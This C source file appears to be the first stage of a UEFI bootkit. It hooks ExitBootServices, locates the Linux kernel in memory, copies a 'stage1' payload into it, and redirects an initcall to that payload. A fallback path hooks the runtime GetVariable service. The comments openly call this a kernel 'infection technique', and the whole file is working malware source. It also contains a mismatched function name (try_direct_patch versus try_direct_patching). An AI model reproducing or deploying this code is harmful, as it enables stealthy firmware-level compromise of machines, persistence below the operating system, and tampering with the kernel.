/* UEFI ExitBootServices hook to patch the kernel.
 * Need to check how well this works with memory protection, as we are writing
 * to our own segement.
 */
#include <efi.h>
#include <efilib.h>
#include "../stage2-kshelf-loader/runtime.h"

// Want it pre-initialized
EFI_EXIT_BOOT_SERVICES orig_exitbootservices = 0x41424344;
EFI_SYSTEM_TABLE *systable = 0x41424344;
EFI_BOOT_SERVICES *bootservices = 0x41424344;
int called = 0;


int compare(char a, char b)
{
    return a == b;
}


void *memcpy(void *dest, const void *src, int n)
{
    char *d = (char *)dest;
    char *s = (char *)src;
    for (int i = 0; i < n; i++) {
        d[i] = s[i];
    }
    return dest;
}

#ifdef DIRECT_PATCHING

/* Check if this address is mapped, and a valid entrypoint */
int check_address(void *addr, UINT64 pc)
{
    char *to_test = addr;
    // Some fixed values we know from startup_32
    if (!compare(to_test[0], 0xfc)) {
        return 0;
    }

    if (!compare(to_test[1], 0x0f)) {
        return 0;
    }

    return 1;
}

/* Apply our kernel patches */
void apply_patch(void *addr)
{
    // Copy our payload in.
    memcpy(addr + LOAD_OFFSET, stage1, stage1_len);
    // Hook our target initcall.
    UINT32 *target = addr + _initcall_offset;
    *target = (UINT32) (LOAD_OFFSET - _initcall_offset);
}


/* This is a cavity based infection technique, that works well for >6.6 kernels
 */
int try_direct_patching()
{
    int res = 0;
    // Lets get the memory map
    UINTN mapsize = 0, mapkey, descriptorsize;
    EFI_MEMORY_DESCRIPTOR *map = NULL;
    UINT32 descriptorversion;
    
    bootservices->GetMemoryMap(
        &mapsize,
        map,
        &mapkey,
        &descriptorsize,
        &descriptorversion
    );

    mapsize = mapsize + descriptorsize * 10;
    bootservices->AllocatePool(
        EfiBootServicesData,
        mapsize,
        (void **)&map
    );

    bootservices->GetMemoryMap(
        &mapsize,
        map,
        &mapkey,
        &descriptorsize,
        &descriptorversion
    );

    int count = mapsize / descriptorsize;
    /* Now we have the memory map, lets hunt */
    for (int i = 0; i < count; i++) {
        EFI_MEMORY_DESCRIPTOR *curr = \
            (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)map + i * descriptorsize);
        
        if (curr->Type != EfiLoaderCode) {
            continue;
        }
        
        if (check_address(curr->PhysicalStart, curr->NumberOfPages)) {
            /* + 0x80 as that is startup_64 */
            apply_patch(curr->PhysicalStart + _startup_64);
            res = 1;
            break;
        }
    }

    if (map != NULL) {
        bootservices->FreePool(&map);
    }

    return res;
}

#endif

void install_runtime_hook()
{
    char *data = NULL;
    EFI_STATUS status = bootservices->AllocatePages(
        AllocateAnyPages, EfiRuntimeServicesCode, 0x300, &data
    );

    if (status != EFI_SUCCESS) {
        while (1) {}
    }

    /* Installing a runtime services hook */
    memcpy(data, runtime_bin, runtime_bin_len);
    /* Copy a few pointers */
    /* -> The function we are hooking */
    memcpy(data, (void *) &(systable->RuntimeServices->GetVariable), 8);

    /* -> Address of the field in the struct we replace */
    UINT64 a = &(systable->RuntimeServices->GetVariable);
    memcpy(data+8, (void *) &(a), 8);

    /* And hook! */
    systable->RuntimeServices->GetVariable = data + 16;
}


EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    // Could be potentially called twice, so deal with that.
    if (called == 1) {
        goto done;
    }
    called = 1;

#ifdef DIRECT_PATCHING
    if (!try_direct_patch())
        install_runtime_hook();
#else
    install_runtime_hook();
#endif

done:
    EFI_STATUS ret = orig_exitbootservices(ImageHandle, MapKey);
    return ret;
}


__attribute__ ((section(".text.start")))
void _start(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    bootservices = SystemTable->BootServices;
    systable = SystemTable;
    
    orig_exitbootservices = bootservices->ExitBootServices;
    bootservices->ExitBootServices = exit_bootservices_hook;
}
